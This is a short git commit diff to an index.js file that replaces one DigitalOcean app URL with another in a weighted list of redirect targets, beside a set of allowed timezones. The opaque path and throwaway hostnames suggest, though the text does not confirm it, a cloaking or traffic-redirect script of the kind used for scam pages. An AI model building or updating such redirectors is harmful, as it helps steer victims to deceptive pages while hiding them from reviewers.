176234e18de1e55090bba77ad336808385a907ad
paalakash <palaksh452@gmail.com>
2026-07-17 07:06:26 +0530

    Update index.js

--- index.js
+++ index.js
@@ -34,7 +34,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://squid-app-s972p.ondigitalocean.app/werrx01USAHTML/?bcda", weight: 1.0 }
+    { url: "https://goldfish-app-yjpkn.ondigitalocean.app/werrx01USAHTML/?bcda", weight: 1.0 }
     
 ];
 
